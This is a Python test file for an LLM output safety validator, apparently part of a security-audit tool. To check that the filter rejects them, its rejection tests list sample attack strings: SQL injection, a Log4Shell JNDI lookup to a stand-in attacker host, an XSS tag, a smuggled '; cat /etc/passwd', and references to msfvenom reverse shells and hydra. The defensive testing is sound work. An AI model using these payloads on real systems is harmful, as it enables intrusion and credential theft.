"""The safety validator is a critical control — it is the last line of defense
between the LLM and the user. These tests assert that disallowed shapes are
rejected and that legitimate audit prose passes through.
"""
from worker.ai.safety import is_safe, sanitize


# --- must REJECT ---

def test_rejects_sqli_payload():
    assert not is_safe("Try OR 1=1 to bypass auth")


def test_rejects_union_select():
    assert not is_safe("UNION SELECT password FROM users")


def test_rejects_log4shell_jndi():
    assert not is_safe("Send ${jndi:ldap://attacker/x}")


def test_rejects_unified_diff():
    diff = """\
--- a/app.py
+++ b/app.py
@@ -1,3 +1,4 @@
+import os
"""
    assert not is_safe(diff)


def test_rejects_markdown_diff_fence():
    assert not is_safe("```diff\n- a\n+ b\n```")


def test_rejects_numbered_attack_steps():
    text = "1. Run sqlmap against the endpoint\n2. Capture cookies"
    assert not is_safe(text)


def test_rejects_step_heading():
    assert not is_safe("Step 1: send the payload")


def test_rejects_attacker_tools():
    assert not is_safe("Use msfvenom to generate a reverse shell")
    assert not is_safe("Run hydra against ssh")


def test_rejects_xss_payload():
    assert not is_safe("<script>alert(1)</script>")


def test_rejects_path_traversal_marker():
    assert not is_safe("Use ; cat /etc/passwd to verify")


# --- must ACCEPT ---

def test_accepts_legitimate_finding_text():
    text = (
        "A hardcoded credential was identified in the source. Long-lived static "
        "secrets in source control expand the blast radius of a repository "
        "compromise. Rotate the credential, move it to a managed secret store, "
        "and ensure pre-commit secret scanning is in place."
    )
    assert is_safe(text)


def test_accepts_business_impact_prose():
    text = (
        "An attacker with read access to the repository could obtain the "
        "exposed token and impersonate the application. Potential consequences "
        "include unauthorized data access and billing exposure."
    )
    assert is_safe(text)


def test_sanitize_returns_fallback_on_reject():
    assert sanitize("UNION SELECT *", fallback="ok") == "ok"
    assert sanitize("normal text", fallback="ok") == "normal text"
    assert sanitize(None, fallback="ok") == "ok" or sanitize(None, fallback="ok") is None
